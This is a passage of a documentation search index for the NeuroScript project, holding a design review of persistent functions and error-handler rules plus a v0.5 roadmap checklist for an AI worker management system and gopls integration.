silent. Accidental re-definitions surface immediately, but intentional reloads stay one-liner easy.</p> </li> <li> <p>Tool-gate for <code>system.loadScript</code>    Turning the loader into a tool lets you reuse your existing ACL / overlay machinery, so you\u2019re not inventing a parallel permission system.</p> </li> <li> <p>Filesystem sandbox    A canonical <code>secureJoin</code> check shuts the door on 90 % of path-traversal nonsense.</p> </li> </ol>"},{"location":"project/Version_05/persisting_fns/#minor-caveats-future-hooks","title":"Minor caveats / future hooks","text":"Area Why it might bite later Mitigation Concurrency If multiple goroutines call <code>system.loadScript</code> simultaneously you\u2019ll need table-level locks or CAS on the session\u2019s maps. Wrap <code>registerProc</code> / <code>registerHandler</code> in a mutex or use <code>sync.Map</code>. Versioning You can\u2019t load two versions of <code>utils.math/gcd</code> side-by-side unless you namespace them manually. Consider an optional <code>version \"1.2.3\"</code> attribute in the future. Session bloat Long-running REPLs may accumulate loads of obsolete procedures. Provide <code>system.unloadScript(path)</code> or <code>system.gcProcedures(olderThan time.Duration)</code> later. Testing friction Tests that need a clean slate must spin up a fresh interpreter each time. Cheap if interpreter construction is lightweight; if not, add a <code>Session.Reset()</code> helper. Auditing It\u2019s easy to forget to persist audit logs. Decide now: stdout, structured log file, or an append-only NeuroData log node? <p>None of those are fatal; just keep them on the backlog.</p>"},{"location":"project/Version_05/persisting_fns/#quick-approval-checklist","title":"Quick approval checklist","text":"<ul> <li>[x] Security boundary clear and enforceable</li> <li>[x] DX (developer experience) remains simple (<code>final</code>, <code>override</code>, one tool call)</li> <li>[x] Predictability\u2014no hidden state leaks between loads</li> <li>[x] Extensibility\u2014easy to graft versioning, unload, or stricter ACL later</li> </ul> <p>If you tick all the above\u2014and your unit tests cover the edge cases we listed\u2014then ship it.</p> <p>btw: I think NO to file-level error handlers -- it is tempting, but the principle is \"clarity over brevity\"</p> <p>Got it \u2014 I agree that outlawing file-level (top-level) error handlers is the cleanest call.</p>"},{"location":"project/Version_05/persisting_fns/#why-its-the-right-default","title":"Why it\u2019s the right default","text":"Criterion Function-scoped handlers only File-level handlers Readability Anyone reading a function sees exactly what can intercept its errors. Reader must hunt elsewhere in the file (or in another file that re-loads) to know what happens on failure. Local reasoning Error-handling logic lives next to the code it protects. Control flow becomes implicit and scattered. Test isolation Each unit test sets up only the handlers it needs. Hidden global handlers make tests flaky and surprising. Hot-reload safety No persistence headaches; handlers vanish when the call frame unwinds. You\u2019d need extra rules for overriding/clearing global handlers after reloads. Consistency with <code>final</code> / <code>override</code> Fewer interaction cases to specify. You\u2019d have to invent <code>final on error</code> semantics or risk silent shadowing."},{"location":"project/Version_05/persisting_fns/#recommended-compiler-rule","title":"Recommended compiler rule","text":"<pre><code>on error { \u2026 }  # legal only inside a procedure / event handler block\n</code></pre> <p>Emit a compile-time error (<code>ERR_TOP_LEVEL_ERROR_HANDLER</code>) if encountered at the root of a file.</p>"},{"location":"project/Version_05/persisting_fns/#alternative-pattern-if-someone-truly-needs-global-trapping","title":"Alternative pattern if someone truly needs \u201cglobal\u201d trapping","text":"<ol> <li>Designate a well-named procedure:</li> </ol> <pre><code>final func system.globalError(err error) {\n    log.error(\"Fatal: \" + err.message)\n    system.exit(1)\n}\n</code></pre> <ol> <li>Runtime option: <code>SessionOptions.GlobalErrorHook = \"system.globalError\"</code></li> </ol> <p>The interpreter calls that hook only when an uncaught error bubbles to the top.    Still explicit, still discoverable, still guarded by <code>final</code>.</p> <p>Bottom line: keep error handling local and explicit; document the \u201chook\u201d mechanism for the rare case where you truly need a final catch-all. That preserves clarity without sacrificing capability.</p>"},{"location":"project/Version_05/road_to_05/","title":"Road to 05","text":"<p># NeuroScript v0.5.0 Development Tasks</p> <p>## Vision (Summary)</p> <ul> <li>Worker Management System able to perform symphonic tasks, with robust configuration, operational controls, and foundational learning capabilities.</li> <li>gopls integration allows fast, efficient, and reliable AI-driven Go code development.</li> </ul>"},{"location":"project/Version_05/road_to_05/#language","title":"Language","text":"<ul> <li>[ ] Fix persisting fns</li> <li>[ ] add final and friends (persisting_fns.md)</li> <li>[ ] remove need for line continuation if easy (check at least)</li> <li>[ ] fn built in type?  (closures?) -- likely later</li> <li>[ ] fuzzy literal</li> <li>[ ] other specialized types literals?</li> <li>[ ] mustbe</li> <li>[ ] remove nil values -- how hard? desirable?</li> <li>[ ] complete API facades for tools etc.</li> </ul> <p>(via Freddy and gemini)</p> <p>Of course. Freddy's feedback provides a great roadmap for future language development. Here is a compiled list of potential additions, categorized by their likely implementation difficulty.</p>"},{"location":"project/Version_05/road_to_05/#short-term-easy-additions","title":"Short-Term (Easy Additions)","text":"<p>These are features that are relatively straightforward to add and would improve the language's expressiveness and quality of life for developers.</p> <ul> <li>Add <code>exp()</code> function: While <code>E ** x</code> works, a built-in <code>exp(x)</code> function is a standard mathematical utility that should be included.</li> <li>Implement Bit-Shifting Operators: Add <code>&lt;&lt;</code> (left shift) and <code>&gt;&gt;</code> (right shift) to complete the set of bitwise operators.</li> <li>Standardize Terminology: Consistently use the term \"function\" instead of \"procedure\" throughout the documentation to avoid ambiguity.</li> <li>Rename <code>Unknown</code> Type: Change the <code>Unknown</code> type to <code>any</code>. This is more in line with modern programming language conventions and is less ambiguous.</li> <li>Clarify <code>some</code> vs. <code>not no</code>: Add an explicit note in the guide that <code>some</code> is syntactic sugar and is logically equivalent to <code>not (no ...)</code>.</li> </ul>"},{"location":"project/Version_05/road_to_05/#mediumlong-term-more-complex-features","title":"Medium/Long-Term (More Complex Features)","text":"<p>These features would add significant power to NeuroScript but require more design and implementation effort.</p> <ul> <li><code>switch</code>/<code>case</code> Statement: A <code>switch</code> statement would be a more elegant and readable way to handle multi-way conditional logic than nested <code>if/else</code> chains.</li> <li>Concurrent I/O (<code>select</code>): Introducing a mechanism for handling concurrent, blocking I/O (similar to Go's <code>select</code> statement) would be a major feature, enabling more advanced agentic and networking tasks.</li> <li>Head/Tail List Destructuring: Adding support for destructuring lists into a \"head\" element and a \"tail\" list (e.g., <code>set h, t = myList</code>) is a powerful feature from functional programming that would make list processing more elegant.</li> <li>Named <code>emit</code> Streams: To better support conversational agents and complex systems, the <code>emit</code> statement could be extended to target named streams (e.g., <code>emit to \"debug\" \"message\"</code>), allowing for multiple, distinct output channels.</li> </ul> <p>## Worker Management System</p> <ul> <li>See design document: [docs/core/ai_wm_design.md]</li> </ul> <p>### From version 0.3.0 Review</p> <ul> <li>[-] Design for stateful worker interaction and task lifecycle. @ai_wm      :: note: Superseded and expanded by v0.5 worker pool and queue design. Stateful interaction will leverage these new components.</li> <li>[-] Tooling for SAI to assign/monitor tasks on workers. @ai_wm @sai      :: note: Partially addressed by foundational SAI hooks in v0.5 (Section M of WMS enhancements), further SAI-specific tooling will be a future focus. This also ties into the \"Shared Memory &amp; Lessons Learned\" (Section N).</li> <li>[-] Agent mode permitted, allow &amp; deny lists @ai_wm @security      :: note: Addressed by v0.5 enhancements: definition-specific ToolAllowlist/ToolDenylist (Section A.10, E, K.1 of WMS enhancements). Agent mode itself is a higher-level application concern using these features.</li> </ul> <p>### New for version 0.5.0</p> <ul> <li> <p>| | 6. AI Worker Management System Enhancements (v0.5 Focus) @ai_wm @core @roadmap_v0.5    :: description: Implement advanced features for AI Worker Management including global data sources, work item definitions, worker pools, work queues, configurable loading policies, enhanced context resolution, and foundational support for lessons learned.    :: dependsOn: docs/core/ai_wm_design.md</p> </li> <li> <p>| | A. Foundational Type Definitions (<code>pkg/core/ai_worker_types.go</code>)</p> <ul> <li>[ ] A.1. Define <code>GlobalDataSourceDefinition</code> struct (Name, Type, Description, LocalPath, AllowExternalReadAccess, FileAPIPath, RemoteTargetPath, ReadOnly, Filters, Recursive, Metadata, Timestamps).</li> <li>[ ] A.2. Define <code>DataSourceType</code> enum (<code>DataSourceTypeLocalDirectory</code>, <code>DataSourceTypeFileAPI</code>).</li> <li>[ ] A.3. Define <code>InstanceRetirementPolicy</code> struct (MaxTasksPerInstance, MaxInstanceAgeHours).</li> <li>[ ] A.4. Define <code>AIWorkerPoolDefinition</code> struct (PoolID, Name, TargetAIWorkerDefinitionName, MinIdleInstances, MaxTotalInstances, InstanceRetirementPolicy, DataSourceRefs, SupervisoryAIRef, IsMissionCritical, Metadata, Timestamps).</li> <li>[ ] A.5. Define <code>RetryPolicy</code> struct (MaxRetries, RetryDelaySeconds).</li> <li>[ ] A.6. Define <code>WorkQueueDefinition</code> struct (QueueID, Name, AssociatedPoolNames, DefaultPriority, RetryPolicy, PersistTasks, DataSourceRefs, SupervisoryAIRef, IsMissionCritical, Metadata, Timestamps).</li> <li>[ ] A.7. Define <code>WorkItemDefinition</code> struct (WorkItemDefinitionID, Name, Description, DefaultTargetWorkerCriteria, DefaultPayloadSchema, DefaultDataSourceRefs, DefaultPriority, DefaultSupervisoryAIRef, Metadata, Timestamps).</li> <li>[ ] A.8. Define <code>WorkItemStatus</code> enum (e.g., <code>Pending</code>, <code>Processing</code>, <code>Completed</code>, <code>Failed</code>, <code>Retrying</code>, <code>Cancelled</code>).</li> <li>[ ] A.9. Define <code>WorkItem</code> struct (TaskID, WorkItemDefinitionName?, QueueName, TargetWorkerCriteria, Payload, DataSourceRefs, Priority, Status, Timestamps, RetryCount, Result, Error, PerformanceRecordID, SupervisoryAIRef, Metadata).</li> <li>[ ] A.10. Modify <code>AIWorkerDefinition</code> to include <code>DataSourceRefs []string</code>, <code>ToolAllowlist []string</code>, <code>ToolDenylist []string</code>, and <code>DefaultSupervisoryAIRef string</code>.</li> <li>[ ] A.11. Modify <code>AIWorkerInstance</code> to include <code>PoolID string</code>, <code>CurrentTaskID string</code>, instance-level <code>DataSourceRefs []string</code>, <code>SupervisoryAIRef string</code>, <code>CurrentOperationalLog []OperationalLogEntry</code> (runtime), and <code>LastTaskSummary string</code>.</li> <li>[ ] A.12. Define <code>ConfigLoadPolicy</code> enum for <code>AIWorkerManager</code> (e.g., <code>FailFastOnError</code>, <code>LoadValidAndReportErrors</code>).</li> <li>[ ] A.13. Define <code>AIWorkerManagementConfigBundle</code> struct for omni-loading.</li> <li>[ ] A.14. Add <code>WorkerGeneratedSummary string</code> and optional <code>OperationalLogRef string</code> fields to <code>PerformanceRecord</code> struct.</li> <li>[ ] A.15. Define <code>DistilledLesson</code> struct (LessonID, Title, ApplicabilityContext, Insight, ActionableSteps, Confidence, EvidenceLinks, CreatedBySAI, Version, Timestamp) - for future use, define type now.</li> <li>[ ] A.16. (NEW) Define <code>OperationalLogEntry</code> struct (Timestamp, StepName, ObservationDecision, ToolCallDetails, IntermediateResultHash, KeyInsight) - for <code>AIWorkerInstance.CurrentOperationalLog</code>.</li> </ul> </li> <li> <p>| | B. AIWorkerManager Core Logic Updates (<code>pkg/core/ai_wm.go</code>)</p> <ul> <li>[ ] B.1. Implement <code>ConfigLoadPolicy</code> setting within <code>AIWorkerManager</code> and its effect on <code>LoadConfigBundleFromString</code>.<ul> <li>[ ] B.1a. Implement \"Validate Phase\" for <code>LoadConfigBundleFromString</code>: validate all definitions in a bundle (structural, security, inter-ref within bundle &amp; existing) before activating any. Collect all errors.</li> <li>[ ] B.1b. Implement \"Activate Phase\" for <code>LoadConfigBundleFromString</code>: commit validated definitions to live registries and persist, based on <code>ConfigLoadPolicy</code> and validation results.</li> </ul> </li> <li>[ ] B.2. Implement internal <code>validate&lt;Type&gt;DefinitionUnsafe</code> methods for each definition type.</li> <li>[ ] B.3. Implement internal <code>activate&lt;Type&gt;DefinitionUnsafe</code> methods for each definition type (assigns IDs, timestamps, stores in map, calls persist).</li> <li>[ ] B.4. Design and implement the Task Dispatcher component/logic.</li> <li>[ ] B.4a. Monitor queues for pending <code>WorkItem</code>s.</li> <li>[ ] B.4b. Identify compatible <code>AIWorkerPool</code>s for a <code>WorkItem</code>, considering <code>IsMissionCritical</code> status.</li> <li>[ ] B.4c. Request idle instances from pools.</li> <li>[ ] B.4d. Assign <code>WorkItem</code>s to instances, assembling and providing full effective context (including future knowledge injection).</li> <li>[ ] B.5. Refactor or adapt existing <code>ExecuteStatelessTask</code> logic to align with the new queueing system.</li> <li>[ ] B.6. Ensure <code>AIWorkerManager</code> correctly initializes its own configuration (like <code>ConfigLoadPolicy</code>) and manages runtime states of all definitions, pools, and queues.</li> </ul> </li> <li> <p>| | C. Global DataSource Management (<code>pkg/core/ai_wm_datasources.go</code> - new conceptual file, logic in <code>ai_wm.go</code>)</p> <ul> <li>[ ] C.1. Implement CRUD logic (validate, activate, store, persist) in <code>AIWorkerManager</code> for <code>GlobalDataSourceDefinition</code>s.</li> <li>[ ] C.2. Implement security validation for <code>GlobalDataSourceDefinition.LocalPath</code> with <code>AllowExternalReadAccess</code> (against admin whitelist).</li> </ul> </li> <li> <p>| | D. WorkItemDefinition Management (<code>pkg/core/ai_wm_item_defs.go</code> - new conceptual file, logic in <code>ai_wm.go</code>)</p> <ul> <li>[ ] D.1. Implement CRUD logic in <code>AIWorkerManager</code> for <code>WorkItemDefinition</code>s.</li> </ul> </li> <li> <p>| | E. AIWorkerDefinition Enhancements (Logic in <code>ai_wm_definitions.go</code>, <code>ai_wm.go</code>)</p> <ul> <li>[ ] E.1. Update <code>AIWorkerManager</code> CRUD logic for <code>AIWorkerDefinition</code> to handle new fields: <code>DataSourceRefs</code>, <code>ToolAllowlist</code>, <code>ToolDenylist</code>, <code>DefaultSupervisoryAIRef</code>.</li> <li>[ ] E.2. Ensure persistence for <code>AIWorkerDefinition</code> includes these new fields.</li> </ul> </li> <li> <p>| | F. AIWorkerPool Implementation (<code>pkg/core/ai_wm_pools.go</code> - new conceptual file, logic in <code>ai_wm.go</code>)</p> <ul> <li>[ ] F.1. Implement CRUD logic in <code>AIWorkerManager</code> for <code>AIWorkerPoolDefinition</code>s (including <code>IsMissionCritical</code>).</li> <li>[ ] F.2. Develop runtime <code>AIWorkerPool</code> management logic within <code>AIWorkerManager</code> (instance tracking, scaling, retirement, providing idle instances).</li> </ul> </li> <li> <p>| | G. WorkQueue &amp; WorkItem Implementation (<code>pkg/core/ai_wm_queues.go</code> - new conceptual file, logic in <code>ai_wm.go</code>)</p> <ul> <li>[ ] G.1. Implement CRUD logic in <code>AIWorkerManager</code> for <code>WorkQueueDefinition</code>s (including <code>IsMissionCritical</code>).</li> <li>[ ] G.2. Develop runtime <code>WorkQueue</code> management logic within <code>AIWorkerManager</code> (holding <code>WorkItem</code>s - in-memory for Phase 1).<ul> <li>[ ] G.2a. Logic for constructing a <code>WorkItem</code> (assigning <code>TaskID</code>, <code>SubmitTimestamp</code>, <code>Status=Pending</code>) using an optional <code>WorkItemDefinitionName</code> as a template, merging/overriding with explicitly provided fields.</li> </ul> </li> <li>[ ] G.3. Implement logic for adding <code>WorkItem</code>s to a queue and retrieving them for the dispatcher.</li> <li>[ ] G.4. Logic for <code>AIWorkerManager</code> (or instance via callback) to update <code>WorkItem</code> status, result, error, timestamps, and link to <code>PerformanceRecordID</code>.</li> <li>[ ] G.5. (Future Phase) Implement <code>WorkItem</code> persistence if <code>WorkQueueDefinition.PersistTasks</code> is true.</li> </ul> </li> <li> <p>| | H. Context Resolution Logic (<code>pkg/core/ai_wm.go</code>, task execution path)</p> <ul> <li>[ ] H.1. Implement logic in <code>AIWorkerManager</code> (Task Dispatcher) to resolve Effective DataSources for a task (additive merge: <code>WorkItem</code> -&gt; <code>WorkItemDefinition</code> -&gt; <code>AIWorkerInstance</code> -&gt; <code>AIWorkerPoolDefinition</code> -&gt; <code>WorkQueueDefinition</code> -&gt; <code>AIWorkerDefinition</code>). Store/pass as <code>ResolvedDataSources</code> to instance.</li> <li>[ ] H.2. Ensure <code>AIWorkerInstance</code> execution path uses <code>ResolvedDataSources</code>.</li> <li>[ ] H.3. Ensure tool permissions (<code>ToolAllowlist</code>/<code>ToolDenylist</code> from <code>AIWorkerDefinition</code>) are available to <code>SecurityLayer</code> for the current task context.</li> </ul> </li> <li> <p>| | I. Persistence for New Definitions (<code>pkg/core/ai_wm.go</code>)</p> <ul> <li>[ ] I.1. Implement persistence for <code>GlobalDataSourceDefinition</code>s to/from <code>ai_global_data_source_definitions.json</code>.</li> <li>[ ] I.2. Implement persistence for <code>WorkItemDefinition</code>s to/from <code>ai_work_item_definitions.json</code>.</li> <li>[ ] I.3. Implement persistence for <code>AIWorkerPoolDefinition</code>s to/from <code>ai_worker_pool_definitions.json</code>.</li> <li>[ ] I.4. Implement persistence for <code>WorkQueueDefinition</code>s to/from <code>ai_work_queue_definitions.json</code>.</li> <li>[ ] I.5. Ensure <code>AIWorkerDefinition</code> persistence handles new fields correctly.</li> <li>[ ] I.6. (Future) Persistence for <code>DistilledLesson</code>s to <code>ai_knowledge_base.json</code> or DB.</li> </ul> </li> <li> <p>| | J. NeuroScript Tooling (<code>pkg/core/ai_wm_tools_*.go</code> - new/modified files)</p> <ul> <li>[ ] J.1. Omni-Loader Tool:<ul> <li>[ ] <code>aiWorkerManager.loadConfigBundleFromString(jsonBundleString string, loadPolicyOverride? string)</code></li> </ul> </li> <li>[ ] J.2. Individual Loader Tools (e.g., <code>aiWorkerGlobalDataSource.loadFromString</code>, etc. for all 5 definition types: GlobalDataSource, AIWorker, AIWorkerPool, WorkQueue, WorkItemDefinition).</li> <li>[ ] J.3. CRUD Tools for all 5 definition types (<code>.add</code>, <code>.get</code>, <code>.list</code>, <code>.update</code>, <code>.remove</code> - where <code>add</code> might be covered by <code>loadFromString</code> if it handles creation, and <code>update</code> would take ID/Name and JSON string for respective fields).</li> <li>[ ] J.4. Pool/Queue Runtime Info Tools: <code>aiWorkerPool.getInstanceStatus</code>, <code>aiWorkerWorkQueue.getStatus</code>.</li> <li>[ ] J.5. Task Management Tools: <code>aiWorkerWorkQueue.submitTask</code> (updated for <code>WorkItemDefinitionName</code>), <code>aiWorkerWorkQueue.getTaskInfo</code>.</li> <li>[ ] J.6. File Sync Tool: <code>aiWorker.syncDataSource</code>.</li> <li>[ ] J.7. Manager Config Tools: <code>aiWorkerManager.setConfigLoadPolicy</code>, <code>aiWorkerManager.getConfigLoadPolicy</code>.</li> <li>[ ] J.8. Register all new/updated tools.</li> </ul> </li> <li> <p>| | K. Security Enhancements (<code>pkg/core/security.go</code>, <code>pkg/core/tools_file_api.go</code>)</p> <ul> <li>[ ] K.1. Enhance <code>SecurityLayer</code>'s <code>ValidateToolCall</code> and <code>GetToolDeclarations</code> to accept/use the active worker's definition-specific <code>ToolAllowlist</code> and <code>ToolDenylist</code>.</li> <li>[ ] K.2. Update path resolution logic in <code>FileAPI</code> and <code>SecurityLayer</code> to handle <code>GlobalDataSourceDefinition.LocalPath</code> with <code>AllowExternalReadAccess</code>, using the effective data sources context.</li> <li>[ ] K.3. Rigorously ensure all file write tools remain confined to the primary interpreter sandbox.</li> </ul> </li> <li> <p>| | L. Supervisory AI (SAI) Integration - Foundational Hooks (Future Focus)</p> <ul> <li>[ ] L.1. Define event emission points for key lifecycle events.</li> <li>[ ] L.2. Implement logic to resolve Effective SAI (including from <code>WorkItemDefinition</code>).</li> <li>[ ] L.3. Basic event routing mechanism to the resolved SAI.</li> <li>[ ] L.4. Ensure <code>SupervisorFeedback</code> in <code>PerformanceRecord</code> can be populated by an SAI, and that <code>PerformanceRecord</code> (including new <code>WorkerGeneratedSummary</code>) is part of the info feed to SAIs.</li> <li>[ ] L.5. (Design for Future) Outline <code>KnowledgeBaseManager</code> component responsible for storing and retrieving <code>DistilledLesson</code>s.</li> </ul> </li> <li> <p>| | M. Shared Memory &amp; Lessons Learned (Foundational Work for v0.5 - Full System in v0.6+) @ai_wm @sai @learning      :: description: Lay groundwork for workers to record operational insights and for SAIs to distill these into actionable knowledge.</p> <ul> <li>[ ] M.1. Worker Insight Logging &amp; Summary:<ul> <li>[ ] M.1a. Define NeuroScript tool <code>aiWorker.logOperationalInsight(level string, message string, detailsMap? map)</code> for workers to record significant observations during task execution.</li> <li>[ ] M.1b. Implement logic for <code>AIWorkerInstance</code> to collect insights logged via this tool into <code>CurrentOperationalLog</code>.</li> <li>[ ] M.1c. Implement logic for <code>AIWorkerInstance</code> to produce a <code>WorkerGeneratedSummary</code> (e.g., by concatenating logged insights or an LLM call to summarize its log) and ensure it's included in the <code>PerformanceRecord</code>.</li> </ul> </li> <li>[ ] M.2. SAI Data Collection Point for Learning:<ul> <li>[ ] M.2a. Ensure <code>PerformanceRecord</code>s, including <code>WorkerGeneratedSummary</code> and any <code>SupervisorFeedback</code>, are made available to the designated SAI (e.g., via event feed or queryable mechanism).</li> </ul> </li> <li>[ ] M.3. Knowledge Base (Design Only for v0.5):<ul> <li>[ ] M.3a. Finalize the design for the <code>KnowledgeBaseManager</code> component and the structure of <code>DistilledLesson</code>s.</li> <li>[ ] M.3b. Define the API for SAIs to submit lessons and for workers/dispatchers to query lessons (tool stubs, no backend implementation in v0.5).</li> </ul> </li> <li>[ ] M.4. Contextual Knowledge Injection (Design Only for v0.5):<ul> <li>[ ] M.4a. Design how the Task Dispatcher or <code>AIWorkerInstance</code> will query the (future) <code>KnowledgeBaseManager</code> and how relevant lessons will be formatted and injected into a worker's prompt/context. (No implementation in v0.5)</li> </ul> </li> </ul> </li> <li> <p>| | N. Testing (Renumbered from M)</p> <ul> <li>[ ] N.1. Unit tests for CRUD and validation of all 5 definition types (GDS, AWD, WID, AWPD, WQD - including <code>IsMissionCritical</code>, external path security).</li> <li>[ ] N.2. Unit tests for <code>AIWorkerPool</code> runtime logic.</li> <li>[ ] N.3. Unit tests for <code>WorkQueue</code> runtime logic (including item creation from <code>WorkItemDefinition</code>).</li> <li>[ ] N.4. Unit tests for <code>AIWorkerManager.LoadConfigBundleFromString</code> with different <code>ConfigLoadPolicy</code> values and error conditions.</li> <li>[ ] N.5. Unit tests for Task Dispatcher logic.</li> <li>[ ] N.6. Unit tests for Context Resolution (DataSources, Tool Permissions, basic SAI ref, considering all definition inputs).</li> <li>[ ] N.7. Unit tests for <code>aiWorker.logOperationalInsight</code> and <code>WorkerGeneratedSummary</code> population in <code>PerformanceRecord</code>.</li> <li>[ ] N.8. Integration tests: task submission (using <code>WorkItemDefinition</code>) to queue, execution by pooled worker, result retrieval, and <code>PerformanceRecord</code> checks.</li> <li>[ ] N.9. Tests for all new/updated NeuroScript tools for AI WM.</li> <li>[ ] N.10. Security tests: <code>AllowExternalReadAccess</code> validation, tool permissions, write sandboxing.</li> </ul> </li> </ul> <p>## gopls Integration for Advanced Go Development (v0.5 Focus) @gopls @core @codegen    :: description: Enable NeuroScript to leverage gopls for precise Go code diagnostics and semantic understanding, empowering AI to write compiling code reliably.    :: objective: Allow an AI to write compiling Go code without fail as quickly and efficiently as possible using gopls feedback.    :: dependsOn: docs/gopls_integration_design.md, pkg/core/tools/gopls_client.go (new), pkg/core/tools_gopls.go (new)</p> <ul> <li> <p>| | A. LSP Client Infrastructure (<code>pkg/core/tools/gopls_client.go</code> - new file/package)      :: description: Establish foundational communication with a gopls server instance.</p> <ul> <li>[ ] A.1. Design <code>GoplsClient</code> interface and basic implementation.<ul> <li>[ ] A.1a. Method to start and manage a <code>gopls</code> subprocess.</li> <li>[ ] A.1b. Implement JSON-RPC 2.0 stream handling for LSP messages.</li> <li>[ ] A.1c. Basic LSP request/response/notification handling logic.</li> </ul> </li> <li>[ ] A.2. Implement LSP <code>initialize</code> / <code>initialized</code> handshake sequence.<ul> <li>[ ] A.2a. Send <code>initialize</code> request with client capabilities.</li> <li>[ ] A.2b. Process <code>initialize</code> response from gopls and store server capabilities.</li> <li>[ ] A.2c. Send <code>initialized</code> notification.</li> </ul> </li> <li>[ ] A.3. Implement LSP <code>shutdown</code> / <code>exit</code> sequence for graceful termination.</li> <li>[ ] A.4. Basic error handling and logging for LSP communication issues.</li> </ul> </li> <li> <p>| | B. Workspace and Document Synchronization      :: description: Ensure gopls has an accurate view of the workspace and file contents.</p> <ul> <li>[ ] B.1. Implement <code>GoplsClient</code> methods for LSP <code>textDocument/didOpen</code> notification.<ul> <li>[ ] B.1a. Tool <code>Gopls.NotifyDidOpen (filePath string, content string)</code>.</li> </ul> </li> <li>[ ] B.2. Implement <code>GoplsClient</code> methods for LSP <code>textDocument/didChange</code> notification.<ul> <li>[ ] B.2a. Tool <code>Gopls.NotifyDidChange (filePath string, newContent string)</code>.</li> <li>[ ] B.2b. (Future) Support for incremental changes.</li> </ul> </li> <li>[ ] B.3. Implement <code>GoplsClient</code> methods for LSP <code>textDocument/didSave</code> notification.<ul> <li>[ ] B.3a. Tool <code>Gopls.NotifyDidSave (filePath string)</code>.</li> </ul> </li> <li>[ ] B.4. Implement <code>GoplsClient</code> methods for LSP <code>textDocument/didClose</code> notification.<ul> <li>[ ] B.4a. Tool <code>Gopls.NotifyDidClose (filePath string)</code>.</li> </ul> </li> <li>[ ] B.5. Tool <code>Gopls.SetWorkspaceRoot (workspacePath string)</code>.</li> </ul> </li> <li> <p>| | C. Diagnostic Tools (<code>pkg/core/tools_gopls_diags.go</code> - new conceptual file)      :: description: Provide NeuroScript tools to fetch and interpret diagnostics from gopls.</p> <ul> <li>[ ] C.1. Define <code>DiagnosticInfo</code> struct in Go (mirroring LSP <code>Diagnostic</code>).</li> <li>[ ] C.2. Implement <code>GoplsClient</code> logic to receive/parse <code>textDocument/publishDiagnostics</code>.<ul> <li>[ ] C.2a. Store diagnostics per file URI.</li> </ul> </li> <li>[ ] C.3. NeuroScript Tool: <code>Gopls.GetDiagnostics (filePath string) (diagnostics []DiagnosticInfo)</code>.</li> <li>[ ] C.4. NeuroScript Tool: <code>Gopls.GetAllProjectDiagnostics () (map[string][]DiagnosticInfo)</code>.</li> </ul> </li> <li> <p>| | D. Semantic Information &amp; Contextual Tools (AI-Focused) @gopls @semantic      :: description: Provide tools for AI to get rich semantic information about Go code elements related to diagnostics, using stable addressing.</p> <ul> <li>[ ] D.1. Define NeuroScript internal representation for \"SemanticReference\".<ul> <li>[ ] D.1a. <code>ResourceURI</code> (string).</li> <li>[ ] D.1b. <code>FullyQualifiedName</code> (string, optional).</li> <li>[ ] D.1c. <code>SymbolKind</code> (string, optional).</li> <li>[ ] D.1d. <code>DeclarationLocation</code> (<code>LSPLocation</code>, optional, precise byte offsets).</li> <li>[ ] D.1e. <code>ByteOffsetRange</code> (<code>LSPRange</code>, optional, precise byte offsets).</li> <li>[ ] D.1f. <code>Signature</code> (string, optional).</li> <li>[ ] D.1g. <code>PackagePath</code> (string, optional).</li> </ul> </li> <li>[ ] D.2. Enhance <code>DiagnosticInfo</code> (from C.1) to include <code>SemanticReferenceGuess</code>.</li> <li>[ ] D.3. NeuroScript Tool: <code>Gopls.GetSymbolInfoAt(filePath string, byteOffset int) (symbolInfo map)</code>.<ul> <li>[ ] D.3a. Internal LSP <code>textDocument/hover</code> and <code>textDocument/definition</code>.</li> <li>[ ] D.3b. Convert responses to <code>SemanticReference</code> maps.</li> <li>[ ] D.3c. Consistent byte offset handling.</li> </ul> </li> <li>[ ] D.4. NeuroScript Tool: <code>Gopls.GetSymbolInfoByName(fullyQualifiedName string) (symbolInfo map)</code>.<ul> <li>[ ] D.4a. Investigate gopls <code>workspace/symbol</code> or sequence of calls.</li> <li>[ ] D.4b. Synergize with <code>pkg/core/tools/gosemantic</code>.</li> </ul> </li> <li>[ ] D.5. NeuroScript Tool: <code>Gopls.ListSymbolsInFile(filePath string) (symbols []map)</code>.</li> <li>[ ] D.6. NeuroScript Tool: <code>Gopls.FindWorkspaceSymbols(queryString string) (symbols []map)</code>.</li> <li>[ ] D.7. Ensure tools return <code>SemanticReference</code> format.</li> </ul> </li> <li> <p>| | E. NeuroScript Toolset Registration (<code>pkg/core/tools_gopls.go</code> - new file)</p> <ul> <li>[ ] E.1. Create <code>RegisterGoplsTools(*core.Interpreter)</code>.</li> <li>[ ] E.2. Instantiate and manage <code>GoplsClient</code> lifecycle.</li> <li>[ ] E.3. Register all new <code>Gopls.*</code> tools.</li> </ul> </li> <li> <p>| | F. Testing (gopls)</p> <ul> <li>[ ] F.1. Unit tests for <code>GoplsClient</code> (mocking LSP).</li> <li>[ ] F.2. Integration tests with real <code>gopls</code> server:<ul> <li>[ ] F.2a. <code>initialize</code> handshake.</li> <li>[ ] F.2b. Document sync notifications and diagnostic updates.</li> <li>[ ] F.2c. <code>Gopls.GetDiagnostics</code> with known errors.</li> <li>[ ] F.2d. <code>Gopls.GetSymbolInfoAt/ByName</code> on known symbols.</li> <li>[ ] F.2e. <code>Gopls.ListSymbolsInFile</code> and <code>Gopls.FindWorkspaceSymbols</code>.</li> </ul> </li> <li>[ ] F.3. Test error handling for gopls communication.</li> </ul> </li> </ul> <p>\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500</p>"},{"location":"project/Version_05/road_to_05/#2-worker-management-system-wm","title":"2 \u00b7 Worker-Management System (WM)","text":"<ul> <li>| | Core Work-Queue Abstraction (in-memory v0.4)</li> <li>[ ] Job structure design</li> <li>[ ] <code>tool.WM.AddJobToQueue(queue, job_payload)</code></li> <li>[ ] Queue start/pause (<code>PauseQueue</code>, <code>ResumeQueue</code>)</li> <li>| | Worker Assignment<ul> <li>[ ] Manual / scripted worker-to-queue mapping</li> <li>[ ] Queue config: default worker def ID, pool size</li> <li>[ ] Auto-instantiate default workers per load</li> </ul> </li> <li>| | Job Lifecycle<ul> <li>[ ] States: <code>pending, active, completed, failed</code></li> <li>[ ] Track timestamps &amp; retries</li> </ul> </li> <li>| | Result Accumulation 